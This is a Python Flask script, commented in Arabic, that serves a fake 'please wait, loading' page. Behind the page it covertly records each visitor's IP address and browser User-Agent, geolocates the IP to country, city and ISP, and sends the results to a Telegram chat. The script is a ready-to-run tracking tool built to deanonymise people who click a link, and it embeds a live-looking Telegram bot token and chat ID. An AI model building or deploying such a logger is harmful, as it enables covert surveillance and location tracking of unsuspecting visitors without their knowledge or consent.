from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# إعدادات تيليجرام الصحيحة
TELEGRAM_BOT_TOKEN = "8972111633:AAFyA1hbPsVzMwM1ZzduSCnufgtOwWJ6b9g"
TELEGRAM_CHAT_ID = "960871923"

def get_ip_info(ip):
    # تجاهل الأيبيهات المحلية إذا تم الاختبار من الجهاز نفسه
    if ip in ["127.0.0.1", "localhost"]:
        return "شبكة محلية (Localhost)"
    
    try:
        # جلب البيانات الجغرافية للـ IP مجاناً
        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ar", timeout=3)
        data = response.json()
        if data.get("status") == "success":
            country = data.get("country", "غير معروف")
            city = data.get("city", "غير معروف")
            isp = data.get("isp", "غير معروف")
            return f"🌍 الدولة: {country}\n🏙️ المدينة: {city}\n🏢 المزود: {isp}"
    except Exception as e:
        print(f"Error fetching IP info: {e}")
    
    return "تعذر جلب معلومات الموقع"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error sending telegram message: {e}")

@app.route('/')
def index():
    # جمع بيانات الجهاز والمتصفح والـ IP
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
        
    # جلب معلومات الموقع الجغرافي بناءً على الـ IP
    geo_info = get_ip_info(ip)
    
    # إرسال التنبيه المفصل لتيليجرام
    msg = f"🚨 *زيارة جديدة للموقع!*\n\n🌐 *IP:* `{ip}`\n{geo_info}\n\n💻 *User-Agent:* `{user_agent}`"
    send_telegram_message(msg)
    
    # تصميم الصفحة اللي تظهر للزوار
    html_content = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>جاري التحميل...</title>
        <style>
            body { background-color: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 100px; }
            .loader { border: 6px solid #1e293b; border-top: 6px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <h2>جاري تحضير الصفحة، يرجى الانتظار...</h2>
        <div class="loader"></div>
    </body>
    </html>
    """
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
